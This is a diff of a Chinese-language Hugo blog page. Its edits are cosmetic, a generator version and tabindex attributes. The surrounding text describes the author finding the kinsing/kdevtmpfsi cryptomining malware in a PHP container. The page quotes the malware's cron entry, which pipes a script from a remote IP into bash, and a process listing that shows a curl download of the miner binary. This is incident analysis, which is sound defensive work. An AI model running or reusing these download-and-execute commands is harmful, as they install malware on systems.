@@ -5,7 +5,7 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   
-  <meta name="generator" content="Hugo 0.66.0" />
+  <meta name="generator" content="Hugo 0.89.4" />
 
   
   <meta name="description" content="this is description">
@@ -227,7 +227,7 @@ blockquote,
 <p>POST 方法中的 x-www-form-urlencoded 和 raw 格式 Body 体会写入到 <code>php://input</code> 流中，与之前发现的规律相吻合。</p>
 <h2 id="发现挖矿恶意程序">发现挖矿恶意程序</h2>
 <p>在查找 php:input 数据流问题时，偶然发现容器中运行着两个异常进程，名称分别是 <code>kinsing</code> 和 <code>kdevtmpfsi</code></p>
-<pre><code>root@b3f806f09ccd:~# ps -aux
+<pre tabindex="0"><code>root@b3f806f09ccd:~# ps -aux
 USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
 root         1  0.0  0.0   3992  1152 ?        Ss+  Jan29   0:00 /bin/bash
 root     10085  0.0  0.0   7632  1344 ?        R+   19:54   0:00 ps -aux
@@ -242,7 +242,7 @@ www-data 15605  199 29.3 2930476 2397156 ?     Ssl  Aug04 11245:50 /tmp/kdevtmpf
 <p>删除该计划任务，几分钟后又出现了类似的计划任务。 <code>* * * * * curl http://195.3.146.118/ph.sh | bash &gt; /dev/null 2&gt;&amp;1</code></p>
 <p>再一次删除计划任务，修改了恶意程序名称后，发现恶意程序被重新下载执行</p>
 <p>下载过程中的进程列表如下：</p>
-<pre><code>root@b3f806f09ccd# ps aux
+<pre tabindex="0"><code>root@b3f806f09ccd# ps aux
 USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
 root         1  0.0  0.0   3992  1152 ?        Ss+  Jan29   0:00 /bin/bash
 root        11  0.0  0.0   5504   880 ?        Ss   Jan29   1:18 /usr/sbin/cron
@@ -254,7 +254,7 @@ www-data 11673  0.0  0.0   3992  1880 ?        S    20:57   0:00 bash
 www-data 11765  0.1  0.0  23096  4832 ?        S    20:57   0:00 curl -o /tmp/kinsing http://194.38.20.199/kinsing
 root     11785  0.0  0.0   7632  1412 ?        R+   20:59   0:00 ps aux
 </code></pre><p>通过进程列表可以得到 <code>curl</code> 命令执行的完整进程树</p>
-<pre><code>- [0]
+<pre tabindex="0"><code>- [0]
   - [10749] php-fpm: master
     - [10750] php-fpm: pool
       - [11671] sh
@@ -279,7 +279,7 @@ root     11785  0.0  0.0   7632  1412 ?        R+   20:59   0:00 ps aux
 <li><code>chmod 0444 /tmp/kinsing</code></li>
 </ol>
 <p>这种方法在 <a href="https://stackoverflow.com/questions/60151640/kdevtmpfsi-using-the-entire-cpu">kdevtmpfsi-using-the-entire-cpu</a> 这个页面中被提到，可能针对之前的版本是有效的。但现在已经无法骗过挖矿程序。该恶意程序会修改程序名称然后重新下载并启动。</p>
-<pre><code>root     11413  0.0  0.0   3992  2104 ?        Ss   Aug08   0:00 /bin/bash
+<pre tabindex="0"><code>root     11413  0.0  0.0   3992  2104 ?        Ss   Aug08   0:00 /bin/bash
 www-data 17650  0.0  0.3 718732 29360 ?        Sl   02:30   0:00 /tmp/kinsing_aw7Y9KYM
 www-data 17817  200 29.3 2737844 2398144 ?     Ssl  02:31  90:35 /tmp/kdevtmpfsi593659172
 root     18553  0.0  0.0   7632  1412 ?        R+   03:16   0:00 ps aux
